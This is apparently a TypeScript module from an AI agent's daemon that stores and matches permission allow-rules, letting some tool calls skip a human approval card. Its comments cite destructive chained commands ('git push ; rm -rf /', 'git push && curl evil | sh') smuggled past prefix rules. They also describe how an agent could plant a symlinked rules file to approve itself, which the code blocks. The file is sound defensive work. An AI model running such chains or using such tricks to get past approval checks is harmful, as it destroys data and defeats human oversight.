import { existsSync, lstatSync, mkdirSync, readFileSync, realpathSync, renameSync, statSync, type Stats, writeFileSync } from "node:fs";
import { join, sep } from "node:path";
import { hasShellHazards } from "./shell-scan";
import { dangerousDomainMatch } from "./dangerous-domains";

/**
 * CC-grammar allow-rules store (SP-approvals Task 1) — the foundation the engine gate (Task 3)
 * and approval-card persistence (Task 5) build on. Norma's `ask` policy today re-prompts forever;
 * this store lets a call that matches a standing rule skip that prompt. Two scopes:
 *
 *  - "global": rules that apply regardless of project. Read via the injected `globalAllow` thunk
 *    — the caller wires it to a live settings getter (e.g. `() => settings?.permissions?.allow`),
 *    the SAME hot-settings pattern every other live-reloadable setting in this codebase already
 *    follows (see settings-watcher.ts). `append(..., "global", ...)` writes the other direction: a
 *    read-modify-write of `<normaHome>/settings.json`'s `permissions.allow`, preserving every
 *    other key. The daemon's existing SettingsWatcher (already watching that one file) is what
 *    makes the write hot — this class never watches or caches the global side itself, it just
 *    re-reads the thunk on every call.
 *  - "project": rules scoped to one repo root, persisted at `<projectRoot>/.norma/
 *    permissions.local.json` (gitignored — mirrors settings.ts's own `settings.local.json`
 *    convention: local-only, never committed). This side has no daemon-level watcher (there can
 *    be many project roots over a daemon's life), so this class owns its own hot cache: a
 *    `Map<root, {mtimeMs, size, rules}>`, re-stat'd on every `decision()`/`rulesFor()` call and
 *    only re-read from disk when the mtime or size actually changed. No `fs.watch` anywhere here.
 *    Known caveat of that mtime+size check (SP-approvals T1 review): a rewrite that lands within
 *    the SAME mtime tick AND happens to produce a file of the exact same byte size as what's
 *    cached is indistinguishable from "unchanged" here, so it would keep serving stale (pre-
 *    rewrite) rules until a LATER, actually-detectable change arrives. This is the identical
 *    trade-off any mtime+size change-detector accepts (the one `git`/`make`/etc. have always
 *    accepted) — there's no `fs.watch`, so there's no event to miss, just a coarse-grained
 *    torn-read-adjacent staleness window, not a torn read itself (a reader never sees a
 *    half-written file — `writeFileAtomic` still guarantees that). APFS's mtime resolution is
 *    fine-grained enough in practice that a same-tick collision needs two writes landing in that
 *    same tight window, which the human-paced "review and approve a rule" workflow this store
 *    serves essentially never produces; if it ever matters, the fix is a content hash, not a
 *    watcher.
 *
 * Resilience: a project rules file that's malformed JSON, the wrong shape, or over 64KB is
 * ignored — the LAST good parse for that root is kept (empty if there never was one), and a
 * warning is logged via `console.error` at most once per root for this instance's lifetime (the
 * cache's mtime/size stamp is updated even on a failed parse, so an unchanged-but-still-bad file
 * is never re-parsed or re-logged on a later call). A rule string neither scope's list can parse
 * gets the same one-warning treatment, deduped by the raw string itself. `decision()` never
 * throws — every failure mode degrades to "ignore it", not an error thrown into the gate path.
 *
 * CRITICAL, SP-approvals T1 review: a bash exact/prefix rule NEVER matches a command containing
 * an unquoted shell metacharacter (`;`, `|`, `&`, newline, redirects, command/process
 * substitution, ANSI-C quoting — see `shell-scan.ts`'s `hasShellHazards`, run on the call's RAW
 * command). A naive string-prefix/exact comparison alone let `Bash(git push:*)` match `git push ;
 * rm -rf /`, `git push && curl evil | sh`, and (via whitespace-normalization folding the newline
 * into a space) `git push\nrm -rf /` — a chain riding a narrow prefix rule straight past the human
 * approval card. See `ruleMatches`'s own doc comment for the full mechanics.
 *
 * MINOR, same review: `parseRule` rejects (returns `null`) a parenthesized value on Computer/
 * Worktree (e.g. `"Computer(x)"`) — those calls carry no `command` field for an exact/prefix value
 * to ever compare against, so such a rule could never match anything; it's treated the same as any
 * other unparseable rule string (ignored, warned once) rather than silently accepted as a rule that
 * can never fire. UPDATE (SP-policies, Task 4): Edit is no longer in this bucket for EVERY
 * parenthesized value — `Edit(<absolute path>)` is now a legitimate writable-dir declaration (kind
 * "path", see `parseRule`'s own doc comment below and `editPathRules`); only a RELATIVE `Edit(...)`
 * value still gets this same "unparseable, warn once" treatment.
 *
 * Spec deviation, called out explicitly per the SP-approvals brief: this class does NOT seed the
 * CC-parity default `["Computer"]` allow-rule anywhere. That default is a Task-3 concern — it
 * lands as the DAEMON's getter-level fallback (e.g. `settings?.permissions?.allow ?? ["Computer"]`),
 * so an explicit `"allow": []` in settings.json can disable it. Constructing a bare
 * `PermissionRules` and asking for a `computer` decision with no rules configured anywhere
 * correctly returns `null`, not `"allow"` (see the test suite's explicit regression guard).
 */
export type RuleScope = "project" | "global";

/** Thrown by `append()` for scope `"project"` when `projectRoot` is normaHome itself or nested
 *  inside it — the control-plane guard: a project rules file must never land inside Norma's own
 *  home directory (that's what `scope: "global"` is for), where it could shadow or be confused
 *  with the real global settings file. Also thrown when scope is `"project"` but no projectRoot
 *  was given at all — there is nowhere sensible to write a project-scoped rule without one. */
export class RuleAppendError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "RuleAppendError";
  }
}

const MAX_RULES_FILE_BYTES = 64 * 1024;

// The CC-grammar tool names this store recognizes. Built into the regex below (single source of
// truth) rather than duplicated as a separate literal pattern. "WebFetch" (SP-approvals T10) is
// the exception mechanism for engine.ts's dangerous-domain floor — its ONLY value grammar is
// `domain:<host>` (kind "domain", handled in parseRule below), never a bare "any" form.
const KNOWN_TOOLS = ["BashUnsandboxed", "Bash", "Edit", "Computer", "Worktree", "WebFetch"] as const;
// Matches a bare tool name ("Edit") or a tool name with a single parenthesized value
// ("Bash(git push:*)"). The `s` (dotAll) flag lets the value legitimately contain newlines (e.g.
// a multi-line bash command) instead of silently failing to parse.
const RULE_GRAMMAR = new RegExp(`^(${KNOWN_TOOLS.join("|")})(?:\\((.*)\\))?$`, "s");

/** Rule-text tool name -> the internal tool key `ruleMatches`/`toolForCallName` share. A plain
 *  switch (not a `Record` lookup) so the fixed 4-way mapping reads plainly and needs no
 *  `noUncheckedIndexedAccess`-driven `!`/`??` noise at the call site. The `default` branch is
 *  unreachable given `RULE_GRAMMAR` only ever captures one of `KNOWN_TOOLS` into group 1. */
function internalToolFor(ruleTool: string): string {
  switch (ruleTool) {
    case "BashUnsandboxed": return "bash_unsandboxed";
    case "Bash": return "bash";
    case "Edit": return "edit";
    case "Computer": return "computer";
    case "Worktree": return "worktree";
    case "WebFetch": return "web_fetch";
    default: return ruleTool.toLowerCase();
  }
}

function normalizeWhitespace(s: string): string {
  return s.trim().replace(/\s+/g, " ");
}

/**
 * Parses one CC-grammar rule string. Grammar: `ToolName` alone (kind "any" — every call to that
 * tool is allowed), or `ToolName(value)` where a `value` ending in `:*` is a prefix rule (the
 * `:*` stripped, then whitespace-normalized) and any other `value` is an exact rule (also
 * whitespace-normalized). `ToolName` must be exactly one of Bash/Edit/Computer/Worktree/WebFetch
 * (case-sensitive) — anything else, an unterminated `(`, or an empty string returns `null` rather
 * than throwing; callers (the class below) treat `null` as "ignore this rule, warn once". An
 * empty value (`"Bash()"`, `"Bash(:*)"`) also returns `null` — a rule naming no command at all is
 * far more likely a typo than an intentional "match everything", and CC's own grammar has no such
 * wildcard-via-omission form either (bare `Bash` already covers "any bash call"). A parenthesized
 * value on Computer/Worktree (e.g. `"Computer(x)"`) also returns `null` — see the class doc
 * comment's "MINOR" note above this function for why (no non-bash, non-web_fetch, non-edit call
 * carries a `command`/`url` for such a value to ever compare against, so it could never match
 * anything). A RELATIVE `Edit(...)` value (e.g. `"Edit(path:*)"`) returns `null` the same way —
 * only an ABSOLUTE `Edit(<path>)` value parses, as a FOURTH shape below (kind "path", SP-policies
 * Task 4): a writable-dir declaration, not a call-value comparison (see `editPathRules`).
 *
 * `WebFetch` (SP-approvals T10, spec §7) is a THIRD shape, not a fourth exact/prefix pair: its
 * only recognized value is `domain:<host>` (kind "domain", `host` whitespace-normalized but
 * case-PRESERVED — see `ruleMatches` for where the case-insensitive comparison actually happens).
 * Unlike Bash/Edit/Computer/Worktree, a BARE `"WebFetch"` (no domain) is REJECTED, not treated as
 * kind "any" — every WebFetch rule this store's own writer (engine.ts's "Always allow from this
 * source" approval option) ever produces names a specific matched domain, and a match-every-fetch
 * rule would silence the dangerous-domain floor for EVERY site rather than just the one a human
 * approved; no UI offers that, so the grammar doesn't accept it either.
 */
export function parseRule(s: string): { tool: string; kind: "any" | "exact" | "prefix" | "domain" | "path"; value?: string } | null {
  const m = RULE_GRAMMAR.exec(s);
  if (!m) return null;
  const tool = internalToolFor(m[1]!); // group 1 is mandatory in RULE_GRAMMAR — always set on a match
  const content = m[2];
  if (content === undefined) {
    // Bare "Bash" / "Edit" / "Computer" / "Worktree" -> kind "any". Bare "WebFetch" is REJECTED —
    // see this function's own doc comment above for why it gets no "any" form at all.
    return tool === "web_fetch" ? null : { tool, kind: "any" };
  }
  if (tool === "web_fetch") {
    if (!content.startsWith("domain:")) return null; // WebFetch's ONLY value grammar is "domain:<host>"
    const value = normalizeWhitespace(content.slice("domain:".length));
    return value ? { tool, kind: "domain", value } : null; // empty domain ("WebFetch(domain:)") -> null, same treatment as Bash's empty value
  }
  if (tool === "edit") {
    // Edit(<absolute path>) — path-scoped writable-dir declaration (SP-policies): consumed via
    // editPathRules() to feed the session writable set (engine's writableRoots); NEVER a call-
    // silencer (see ruleMatches). Must be ABSOLUTE — a relative path is meaningless without a cwd
    // this parser doesn't have. NOT whitespace-collapsed (a path may contain spaces) — trim only.
    const value = content.trim();
    return value.startsWith("/") ? { tool, kind: "path", value } : null;
  }
  if (tool !== "bash" && tool !== "bash_unsandboxed") return null; // parenthesized value on a tool with no `command` to match — see doc comment above
  if (content.endsWith(":*")) {
    const value = normalizeWhitespace(content.slice(0, -2));
    return value ? { tool, kind: "prefix", value } : null;
  }
  const value = normalizeWhitespace(content);
  return value ? { tool, kind: "exact", value } : null;
}

/** The tool a runtime call NAME maps to, in `parseRule`'s vocabulary — `write` and `edit` both
 *  map to "edit" (an `Edit` rule covers both; CC's grammar has no separate `Write` rule),
 *  `enter_worktree` and `exit_worktree` both map to "worktree". `web_fetch` maps to "web_fetch"
 *  (SP-approvals T10) — deliberately NOT `web_search`: the dangerous-domain floor (and therefore
 *  its "WebFetch(domain:...)" exception rule) only ever applies to web_fetch, so a WebFetch rule
 *  must never accidentally match a web_search call. Anything else (including tool names this
 *  grammar simply has no opinion on yet, e.g. `read`) maps to `null` and therefore never matches
 *  any rule. */
function toolForCallName(name: string): string | null {
  switch (name) {
    case "bash": return "bash";
    case "write":
    case "edit": return "edit";
    case "computer": return "computer";
    case "enter_worktree":
    case "exit_worktree": return "worktree";
    case "web_fetch": return "web_fetch";
    default: return null;
  }
}

/** Extracts a web_fetch call's `url` arg hostname, lowercased — or `null` on malformed JSON, a
 *  missing/non-string `url` field, or an unparseable URL. Same "malformed input degrades to a safe
 *  null, never throws" shape as `rawCommand` above; used ONLY by `ruleMatches`'s "domain" kind
 *  below (a bash/edit/computer/worktree call never reaches this — `ruleMatches` checks tool
 *  identity first). */
function callUrlHost(argsJson: string): string | null {
  try {
    const parsed = JSON.parse(argsJson || "{}") as { url?: unknown };
    if (typeof parsed.url !== "string") return null;
    return new URL(parsed.url).hostname.toLowerCase();
  } catch {
    return null;
  }
}

/** Raw (NOT whitespace-normalized) `command` field from a tool call's `argsJson` — the exact
 *  string that will actually reach a shell. `hasShellHazards` (in `ruleMatches` below) scans
 *  THIS, never the normalized form — see `ruleMatches`'s own doc comment for why the order
 *  matters. Malformed JSON or a non-string/absent `command` field (true for every non-bash tool's
 *  args) yields `""`. */
function rawCommand(argsJson: string): string {
  try {
    const parsed = JSON.parse(argsJson || "{}") as { command?: unknown };
    return typeof parsed.command === "string" ? parsed.command : "";
  } catch {
    return "";
  }
}

/** SP-policies: does this bash call carry `dangerouslyDisableSandbox: true`? Malformed/absent → false
 *  (a non-escape call). The one bit that makes Bash and BashUnsandboxed rules disjoint. */
function callIsUnsandboxed(argsJson: string): boolean {
  try {
    const a = JSON.parse(argsJson || "{}") as { dangerouslyDisableSandbox?: unknown };
    return a.dangerouslyDisableSandbox === true;
  } catch { return false; }
}

/** `rawCommand`, whitespace-normalized the same way `parseRule` normalizes a rule's value — so
 *  "git   push x" and a rule's "git push" compare as equal tokens. Used ONLY for the actual
 *  exact/prefix VALUE comparison, after `hasShellHazards` has already vetted the raw form. `""`
 *  (from a malformed/non-bash call) can never match a non-empty exact/prefix rule value — a safe
 *  default `ruleMatches` doesn't need to special-case. */
function normalizedCommand(argsJson: string): string {
  return normalizeWhitespace(rawCommand(argsJson));
}

/**
 * Does a parsed rule allow this call? Tool identity first (via `toolForCallName`), then by kind:
 * "any" matches every call mapping to that tool; "exact" requires the normalized `command` to
 * equal the rule's value exactly; "prefix" additionally allows the command to continue past the
 * value with a whitespace boundary (`cmd === value || cmd.startsWith(value + " ")` — "git push
 * origin" matches a "git push" prefix rule, "git pushx" does not).
 *
 * CRITICAL, SP-approvals T1 review: before that value comparison, a bash exact/prefix rule first
 * runs `hasShellHazards` on the call's RAW command (`rawCommand`, NOT `normalizedCommand`) and
 * refuses to match at all if it finds one. Without this, a plain prefix/exact string comparison
 * cannot tell a whole command from a chain's first link: `"git push".startsWith("git push")` is
 * true whether the actual command is `git push origin main` (fine) or `git push ; rm -rf /` /
 * `git push && curl evil | sh` (a SECOND command riding the first one's prefix straight past the
 * approval card). Checking the RAW string matters specifically because `normalizedCommand`
 * collapses a literal newline into a space — `git push\nrm -rf /` would otherwise normalize to
 * "git push rm -rf /", which still starts with "git push " and would have matched; scanning
 * before that collapse is what actually catches it. This check runs for BOTH "exact" and "prefix"
 * kinds (a compound command should never auto-match ANY bash rule, not just a prefix one) but NOT
 * for kind "any" — a bare `Bash` rule is an explicit "allow every bash call" grant with no narrow
 * scope for a chain to escape from, so there is no analogous hole to close there.
 *
 * Kind "domain" (SP-approvals T10) is checked and returned BEFORE the bash-only hazard guard
 * below — no shell hazards apply to a URL, this is a wholly different comparison: it parses the
 * call's `url` arg host (`callUrlHost`) and hands it to `dangerous-domains.ts`'s own
 * `dangerousDomainMatch` (called with a single-entry list — the rule's own value) rather than
 * reimplementing the suffix/case-insensitivity/trailing-dot comparison inline. SP-approvals T10
 * review, HIGH-1: this delegation is exactly WHY that fix (trailing-dot FQDN normalization) only
 * needed to land in one place — before it, this function had its OWN inline copy of the suffix
 * check, which would have needed the identical fix a second time and could easily have drifted from
 * it. An unparseable/missing url never matches.
 */
export function ruleMatches(parsed: NonNullable<ReturnType<typeof parseRule>>, call: { name: string; argsJson: string }): boolean {
  if (parsed.kind === "path") return false; // (Task 4) writable-dir declaration, never a call-silencer
  const tool = toolForCallName(call.name);
  // SP-policies: Bash and BashUnsandboxed are DISJOINT by the call's `dangerouslyDisableSandbox`
  // flag — a plain Bash rule never authorizes a sandbox escape, a BashUnsandboxed rule matches ONLY
  // one. Both share the exact/prefix value comparison + raw-command hazard scan.
  if (parsed.tool === "bash" || parsed.tool === "bash_unsandboxed") {
    if (tool !== "bash") return false;
    const unsandboxed = callIsUnsandboxed(call.argsJson);
    if (parsed.tool === "bash" && unsandboxed) return false;
    if (parsed.tool === "bash_unsandboxed" && !unsandboxed) return false;
    if (parsed.kind === "any") return true;
    if (parsed.value === undefined) return false;
    if (hasShellHazards(rawCommand(call.argsJson))) return false; // a chain can't ride a narrow prefix rule
    const cmd = normalizedCommand(call.argsJson);
    if (parsed.kind === "exact") return cmd === parsed.value;
    return cmd === parsed.value || cmd.startsWith(parsed.value + " ");
  }
  if (tool === null || tool !== parsed.tool) return false;
  if (parsed.kind === "any") return true;
  if (parsed.value === undefined) return false;
  if (parsed.kind === "domain") {
    const host = callUrlHost(call.argsJson);
    if (host === null) return false;
    return dangerousDomainMatch(host, [parsed.value]) !== null;
  }
  const cmd = normalizedCommand(call.argsJson); // edit/computer/worktree exact/prefix (rare)
  if (parsed.kind === "exact") return cmd === parsed.value;
  return cmd === parsed.value || cmd.startsWith(parsed.value + " ");
}

interface ProjectCacheEntry {
  mtimeMs: number;
  size: number;
  rules: string[]; // last-good raw rule strings (unparsed) — parsed fresh on every decision() call
}

function canon(p: string): string {
  try { return realpathSync(p); } catch { return p; }
}

/** tmp-then-rename so a reader never observes a half-written file (mirrors sessions/store.ts's
 *  own repair-write idiom). A fixed `.tmp` suffix is fine: every write to a given path from this
 *  class happens synchronously and sequentially, never concurrently with itself. */
function writeFileAtomic(path: string, content: string): void {
  const tmp = `${path}.tmp`;
  writeFileSync(tmp, content);
  renameSync(tmp, path);
}

function statOrNull(path: string): Stats | null {
  try { return statSync(path); } catch { return null; }
}

/** Like `statOrNull`, but `lstat` — reports the link ITSELF, never following a final symlink. Used
 *  by the symlink-indirection guard below (SP-policies whole-branch review): the rules store must
 *  refuse to TRUST a symlinked `<root>/.norma` (or a symlinked `permissions.local.json`). An agent
 *  that can create a symlink (sandboxed `ln -s`, needing NO write grant) could otherwise point
 *  `.norma` at a decoy dir it CAN write, plant a `permissions.local.json` there (a path with no
 *  `.norma` in it, so the write-guard never flags it), and have the hot reader follow the symlink
 *  and mint allow-rules with no human card — self-escalating the live session, since rules are
 *  hot-read. `statOrNull`/`existsSync` FOLLOW the symlink (they'd read/write the decoy); lstat is
 *  what actually sees the link. */
function lstatOrNull(path: string): Stats | null {
  try { return lstatSync(path); } catch { return null; }
}

export class PermissionRules {
  private readonly cache = new Map<string, ProjectCacheEntry>();
  // Rule strings `parseRule` couldn't parse, already warned about once — keyed by the raw string
  // itself (not by scope/root): the same garbage string showing up again anywhere is still just
  // the same garbage, no need to say so twice.
  private readonly warnedRules = new Set<string>();
  // Roots whose project rules file has already produced one "malformed"/"oversized" warning —
  // keyed by root only (not by which of the two problems it was), so a persistently-broken file
  // never spams the log on every decision() call, and a root that recovers then breaks again in a
  // NEW way still only gets the one warning it already got. See `projectRulesFor` below.
  private readonly warnedFiles = new Set<string>();

  constructor(private readonly deps: { globalAllow: () => string[] | undefined; normaHome: string }) {}

  /** "allow" when any global or project rule matches this call; `null` = no opinion (the caller's
   *  existing `ask` policy decides from there — this class never itself denies). Never throws: a
   *  malformed rule string or rules file degrades to "ignore it", not an error. */
  decision(call: { name: string; argsJson: string }, projectRoot: string | null): "allow" | null {
    const global = this.parsed(this.deps.globalAllow() ?? []);
    if (global.some((r) => ruleMatches(r, call))) return "allow";
    if (projectRoot !== null) {
      const project = this.parsed(this.projectRulesFor(projectRoot));
      if (project.some((r) => ruleMatches(r, call))) return "allow";
    }
    return null;
  }

  /** Persist a rule. `scope: "global"` read-modify-writes `<normaHome>/settings.json`'s
   *  `permissions.allow`, preserving every other key — a corrupt settings.json is left alone (the
   *  parse error propagates) rather than silently replaced, since there's nothing safe to
   *  "preserve other keys" from a file this class can't parse. `scope: "project"` read-modify-
   *  writes `<projectRoot>/.norma/permissions.local.json`, creating the `.norma` directory and
   *  file on first use. Both scopes dedupe (appending an already-present rule is a no-op) and
   *  write atomically (tmp+rename). Throws `RuleAppendError` for `scope: "project"` when
   *  `projectRoot` is missing or is normaHome itself / nested inside it (control-plane guard). */
  append(rule: string, scope: RuleScope, projectRoot: string | null): void {
    if (scope === "project") {
      if (projectRoot === null || this.isControlPlanePath(projectRoot)) {
        throw new RuleAppendError(
          `refusing to write a project permission rule for ${projectRoot ?? "(no project root)"} — ` +
            `it is normaHome itself or nested inside it (${this.deps.normaHome}); use scope "global" instead`,
        );
      }
      this.appendProject(rule, projectRoot);
      return;
    }
    this.appendGlobal(rule);
  }

  /** Exposed for tests/status: the raw (unparsed) rule strings currently in force for a root —
   *  global via the injected thunk, project via the SAME hot-cached read `decision()` itself uses
   *  (so this always reflects exactly what a `decision()` call would see, never a stale separate
   *  read path). `projectRoot: null` -> `project: []` (there is no project scope without a root).
   *  Returns fresh copies — callers cannot mutate this instance's internal cache through them. */
  rulesFor(projectRoot: string | null): { global: string[]; project: string[] } {
    return {
      global: [...(this.deps.globalAllow() ?? [])],
      project: projectRoot !== null ? [...this.projectRulesFor(projectRoot)] : [],
    };
  }

  /** SP-policies: absolute dirs declared by `Edit(<path>)` rules (global ∪ project), deduped. The
   *  engine unions these into the session writable set (writableRoots) so both the write/edit fence
   *  AND bash's seatbelt may write there. A path-less `Edit` rule contributes nothing (no dir — it
   *  relieves edit CARDS only, never widens the sandbox). Same hot read decision() uses. */
  editPathRules(projectRoot: string | null): string[] {
    const raw = [...(this.deps.globalAllow() ?? []), ...(projectRoot !== null ? this.projectRulesFor(projectRoot) : [])];
    const out: string[] = [];
    for (const s of raw) {
      const p = parseRule(s);
      if (p && p.kind === "path" && p.value) out.push(p.value);
    }
    return [...new Set(out)];
  }

  // ---- internals ----

  private parsed(raw: string[]): NonNullable<ReturnType<typeof parseRule>>[] {
    const out: NonNullable<ReturnType<typeof parseRule>>[] = [];
    for (const s of raw) {
      const p = parseRule(s);
      if (p) {
        out.push(p);
        continue;
      }
      if (!this.warnedRules.has(s)) {
        this.warnedRules.add(s);
        console.error(`permission-rules: ignoring unrecognized rule ${JSON.stringify(s)}`);
      }
    }
    return out;
  }

  private isControlPlanePath(projectRoot: string): boolean {
    const root = canon(projectRoot);
    const home = canon(this.deps.normaHome);
    return root === home || root.startsWith(home + sep);
  }

  private projectRulesFile(root: string): string {
    return join(root, ".norma", "permissions.local.json");
  }

  /** The hot mtime+size-checked read-through for one project root's rules file — no `fs.watch`.
   *  Absent file -> `[]` (and drops any stale cache entry: a vanished file means no rules, not
   *  "keep whatever we last saw"). Present-but-unchanged (same mtime AND size as last read) ->
   *  the cached rules, no I/O beyond the `stat`. Changed-and-too-large or changed-and-unparsable
   *  -> last-good rules kept, one warning logged for this root, and the cache's stamp is
   *  advanced to the new (bad) mtime/size anyway — so the SAME bad content is never re-read or
   *  re-logged on a later call, only a further CHANGE (a fix, or a different corruption) would
   *  trigger another read attempt. */
  private projectRulesFor(root: string): string[] {
    // SP-policies whole-branch review residual (symlink indirection): never TRUST — hence never
    // FOLLOW — a symlinked `<root>/.norma` or a symlinked `permissions.local.json`. lstat sees the
    // link itself (statOrNull below would follow it into a decoy dir the agent controls). A
    // symlinked `.norma` (or file) is treated as "this project has NO rules" — the same result as
    // an absent file — and warned about once for this root (reusing warnFileOnce's per-root dedupe).
    // A `.norma` that doesn't exist at all is fine (null lstat → fall through → no rules, as today);
    // a real directory / real file passes straight through. See `lstatOrNull` for the full threat.
    const dotNorma = join(root, ".norma");
    const dotNormaLstat = lstatOrNull(dotNorma);
    if (dotNormaLstat?.isSymbolicLink()) {
      this.warnFileOnce(root, `${dotNorma} is a symlink, not a real directory — refusing to read project permission rules through it`);
      this.cache.delete(root);
      return [];
    }
    const path = this.projectRulesFile(root);
    const fileLstat = lstatOrNull(path);
    if (fileLstat?.isSymbolicLink()) {
      this.warnFileOnce(root, `${path} is a symlink, not a real file — refusing to read project permission rules through it`);
      this.cache.delete(root);
      return [];
    }
    const stat = statOrNull(path);
    if (!stat) {
      this.cache.delete(root);
      return [];
    }
    const cached = this.cache.get(root);
    if (cached && cached.mtimeMs === stat.mtimeMs && cached.size === stat.size) {
      return cached.rules;
    }
    if (stat.size > MAX_RULES_FILE_BYTES) {
      this.warnFileOnce(root, `${path} is over ${MAX_RULES_FILE_BYTES} bytes — ignoring, keeping last-good rules`);
      const rules = cached?.rules ?? [];
      this.cache.set(root, { mtimeMs: stat.mtimeMs, size: stat.size, rules });
      return rules;
    }
    let rules: string[] | null = null;
    try {
      const raw = JSON.parse(readFileSync(path, "utf8"));
      if (raw && Array.isArray(raw.allow) && raw.allow.every((x: unknown) => typeof x === "string")) {
        rules = raw.allow;
      }
    } catch {
      // malformed JSON — `rules` stays null, handled below
    }
    if (rules === null) {
      this.warnFileOnce(root, `${path} is malformed (invalid JSON, or not shaped { allow: string[] }) — ignoring, keeping last-good rules`);
      const kept = cached?.rules ?? [];
      this.cache.set(root, { mtimeMs: stat.mtimeMs, size: stat.size, rules: kept });
      return kept;
    }
    this.cache.set(root, { mtimeMs: stat.mtimeMs, size: stat.size, rules });
    return rules;
  }

  private warnFileOnce(root: string, msg: string): void {
    if (this.warnedFiles.has(root)) return;
    this.warnedFiles.add(root);
    console.error(`permission-rules: ${msg}`);
  }

  private appendProject(rule: string, root: string): void {
    const dotNorma = join(root, ".norma");
    // Defense in depth (SP-policies whole-branch review residual): never write THROUGH a symlinked
    // `<root>/.norma` or a symlinked `permissions.local.json`. A human answering an approval card
    // must never be tricked into planting a rules file into an attacker-chosen dir via a symlink an
    // agent pre-created. lstat sees the link itself (mkdirSync/existsSync/rename below would follow
    // it); throw rather than write through. A `.norma` that doesn't exist yet (null lstat) is fine —
    // mkdir-on-first-use below still creates a REAL dir; a real dir/file passes straight through.
    const dotNormaLstat = lstatOrNull(dotNorma);
    if (dotNormaLstat?.isSymbolicLink()) {
      throw new RuleAppendError(
        `refusing to write a project permission rule for ${root} — ${dotNorma} is a symlink, not a real directory`,
      );
    }
    mkdirSync(dotNorma, { recursive: true });
    const path = this.projectRulesFile(root);
    const fileLstat = lstatOrNull(path);
    if (fileLstat?.isSymbolicLink()) {
      throw new RuleAppendError(
        `refusing to write a project permission rule for ${root} — ${path} is a symlink, not a real file`,
      );
    }
    let obj: any = {}; // dynamic JSON blob — same untyped-any idiom as settings.ts's addLocalDir
    if (existsSync(path)) {
      try {
        obj = JSON.parse(readFileSync(path, "utf8"));
      } catch {
        // Malformed on-disk file: start fresh rather than fail the append. NOT the same leniency
        // as decision()'s read path above (which keeps serving the OLD good rules and leaves the
        // bad file untouched) — this WRITES a fresh file over the corruption. Same tradeoff
        // settings.ts's own addLocalDir already makes for settings.local.json; an append is a
        // user-initiated "grant this" action, so self-healing the file is preferable to refusing.
        obj = {};
      }
    }
    const list: string[] = Array.isArray(obj.allow) ? [...obj.allow] : [];
    if (!list.includes(rule)) list.push(rule);
    writeFileAtomic(path, JSON.stringify({ ...obj, allow: list }, null, 2) + "\n");
    // Update the cache directly from this write rather than waiting for the next stat: on a
    // coarse-grained filesystem clock a same-tick self-write could otherwise look "unchanged" to
    // the mtime check and momentarily serve stale rules back to this SAME instance.
    const stat = statSync(path);
    this.cache.set(root, { mtimeMs: stat.mtimeMs, size: stat.size, rules: list });
  }

  private appendGlobal(rule: string): void {
    const path = join(this.deps.normaHome, "settings.json");
    // Unlike appendProject above, a corrupt settings.json is NOT swallowed to `{}` — that would
    // silently discard the user's real provider config and every other setting. Let JSON.parse's
    // SyntaxError propagate; there is nothing safe to "preserve other keys" from a file this
    // class can't parse.
    //
    // NIT (SP-approvals T1 review): the `: {}` branch below only fires when settings.json doesn't
    // exist AT ALL, which is unreachable in real operation — the daemon always creates/migrates
    // one before anything else can run, and `loadSettings()` itself throws on a missing file
    // rather than tolerating one (see settings.ts). Left permissive rather than throwing here too:
    // a normaHome with no settings.json yet has nothing to "preserve other keys" FROM either way,
    // and today only a test that deliberately skips bootstrapping one exercises this branch.
    const obj: any = existsSync(path) ? JSON.parse(readFileSync(path, "utf8")) : {}; // same untyped-any idiom as settings.ts's loadSettings
    obj.permissions ??= {};
    const list: string[] = Array.isArray(obj.permissions.allow) ? [...obj.permissions.allow] : [];
    if (!list.includes(rule)) list.push(rule);
    obj.permissions.allow = list;
    writeFileAtomic(path, JSON.stringify(obj, null, 2) + "\n");
  }
}
